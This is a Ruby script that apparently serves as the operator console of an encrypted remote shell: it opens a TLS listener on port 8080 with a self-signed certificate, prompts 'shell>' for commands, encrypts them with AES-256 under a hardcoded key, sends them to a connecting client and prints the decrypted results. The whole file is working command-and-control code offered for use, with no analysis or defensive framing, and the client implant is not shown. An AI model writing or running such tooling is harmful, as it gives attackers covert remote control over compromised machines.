#!/usr/bin/env ruby
require 'socket'
require 'openssl'
require 'base64'
def encrypt(command)
  @aes.encrypt
  @aes.key = @key
  #aes.iv = iv
  encrypted_data = @aes.update(command) + @aes.final
  encoded_command = Base64.encode64(encrypted_data)
  return encoded_command
end
def decrypt(command)
  @aes.decrypt
  @aes.key = @key
  #aes.iv = iv
  base64_data = command
  decode_data = Base64.decode64(base64_data)
  decrypt_data = @aes.update(decode_data) + @aes.final
  return decrypt_data
end
def ssl_setup
  tcp_server = TCPServer.new('localhost',8080)
  ctx = OpenSSL::SSL::SSLContext.new
  ctx.key = OpenSSL::PKey::RSA.new 2048
  ctx.cert = OpenSSL::X509::Certificate.new
  ctx.cert.subject = OpenSSL::X509::Name.new [['CN', 'localhost']]
  ctx.cert.issuer = ctx.cert.subject
  ctx.cert.public_key = ctx.key
  ctx.cert.not_before = Time.now
  ctx.cert.not_after = Time.now + 60 * 60 * 24
  ctx.cert.sign ctx.key, OpenSSL::Digest::SHA1.new
  server = OpenSSL::SSL::SSLServer.new tcp_server, ctx
  client = server.accept
  return client
end
def start_loop(client)
  loop {
    command = [(print ("shell> ")), $stdin.gets.rstrip][1]
    start_loop(client) if command == ''
    encrypted_command = encrypt(command)
    client.print("#{encrypted_command}\n")
    exit if command == 'exit'
    results = client.gets
    decrypt_results = decrypt(results)
    puts decrypt_results.split('\n')
  }
end
begin
  @aes = OpenSSL::Cipher.new("AES-256-CFB")
  #rand_key = 32.times.map {[*'a'..'z',*'A'..'Z',*'0'..'9',*'!'..')'].sample}.join
  @key = 'abcdefghijklmnopqrstuvwxyz123456'
  client = ssl_setup
  start_loop(client)
end
